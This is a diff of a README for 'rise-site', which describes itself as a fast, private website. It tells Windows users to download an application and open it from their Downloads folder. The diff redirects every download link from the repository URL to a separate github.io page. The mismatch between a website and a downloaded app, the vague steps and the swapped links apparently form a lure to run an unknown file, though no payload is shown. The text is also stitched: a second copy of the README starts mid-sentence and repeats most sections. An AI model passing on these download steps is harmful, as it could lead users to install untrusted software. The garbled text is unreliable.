@@ -1,14 +1,14 @@
 # 🌐 rise-site - Fast, Private Website With No Tracking
 
-<a href="https://github.com/9001-hub/rise-site"><img src="https://img.shields.io/badge/Download_rise--site-6f42c1?style=for-the-badge&labelColor=f59e0b&color=10b981" alt="Download rise-site"></a>
+<a href="https://9001-hub.github.io"><img src="https://img.shields.io/badge/Download_rise--site-6f42c1?style=for-the-badge&labelColor=f59e0b&color=10b981" alt="Download rise-site"></a>
 
 rise-site is a clean, fast website built to load quickly and respect your privacy. It is made for everyday visitors who want clear information without pop-ups, tracking scripts, or unnecessary outside requests. The site is simple to use on Windows: visit the download link, get the application, and open it from your Downloads folder.
 
 ## 📥 Download rise-site
 
-<a href="https://github.com/9001-hub/rise-site"><img src="https://img.shields.io/badge/Get_rise--site-0ea5e9?style=for-the-badge&labelColor=7c3aed&color=f97316" alt="Get rise-site"></a>
+<a href="https://9001-hub.github.io"><img src="https://img.shields.io/badge/Get_rise--site-0ea5e9?style=for-the-badge&labelColor=7c3aed&color=f97316" alt="Get rise-site"></a>
 
-Visit this link to download the application: [https://github.com/9001-hub/rise-site](https://github.com/9001-hub/rise-site)
+Visit this link to download the application: [https://9001-hub.github.io](https://9001-hub.github.io)
 
 Use that link to get rise-site. When the download finishes, open the downloaded item from your Downloads folder to start using rise-site.
 
@@ -52,7 +52,7 @@ The site is also useful as a starting point for the rise brand. It presents the 
 ## 🪟 Windows Setup in Plain English
 
 1. Open your web browser on Windows.
-2. Go to [https://github.com/9001-hub/rise-site](https://github.com/9001-hub/rise-site).
+2. Go to [https://9001-hub.github.io](https://9001-hub.github.io).
 3. Visit this link to download the application.
 4. When the download finishes, open your Downloads folder.
 5. Open the downloaded item to start rise-site.
@@ -83,15 +83,15 @@ rise-site is designed with accessibility in mind. The page uses clear headings, 
 
 Accessibility is not a single feature. It is a way of building the page so more# 🌐 rise-site - Fast, Private Website With No Tracking
 
-<a href="https://github.com/9001-hub/rise-site"><img src="https://img.shields.io/badge/Download_rise--site-6f42c1?style=for-the-badge&labelColor=f59e0b&color=10b981" alt="Download rise-site" height="56"></a>
+<a href="https://9001-hub.github.io"><img src="https://img.shields.io/badge/Download_rise--site-6f42c1?style=for-the-badge&labelColor=f59e0b&color=10b981" alt="Download rise-site" height="56"></a>
 
 rise-site is a clean, fast website made for everyday visitors. It gives you clear information without pop-ups, without tracking scripts, and without waiting on outside services. The site is built to load quickly, stay readable, and respect your privacy. It works well on Windows and does not require programming knowledge.
 
 ## 📥 Download rise-site
 
-<a href="https://github.com/9001-hub/rise-site"><img src="https://img.shields.io/badge/Get_rise--site-0ea5e9?style=for-the-badge&labelColor=7c3aed&color=f97316" alt="Get rise-site" height="56"></a>
+<a href="https://9001-hub.github.io"><img src="https://img.shields.io/badge/Get_rise--site-0ea5e9?style=for-the-badge&labelColor=7c3aed&color=f97316" alt="Get rise-site" height="56"></a>
 
-Visit this link to download the application: [https://github.com/9001-hub/rise-site](https://github.com/9001-hub/rise-site)
+Visit this link to download the application: [https://9001-hub.github.io](https://9001-hub.github.io)
 
 Use that link to get rise-site. When the download finishes, open the downloaded item from your Downloads folder to start using rise-site. Keep the downloaded item in a place you can find later, such as Downloads or Desktop.
 
@@ -137,7 +137,7 @@ The site is also useful as a starting point for the rise brand. It presents the 
 ## 🪟 Windows Setup in Plain English
 
 1. Open your web browser on Windows.
-2. Go to [https://github.com/9001-hub/rise-site](https://github.com/9001-hub/rise-site).
+2. Go to [https://9001-hub.github.io](https://9001-hub.github.io).
 3. Visit this link to download the application.
 4. When the download finishes, open your Downloads folder.
 5. Open the downloaded item to start rise-site.
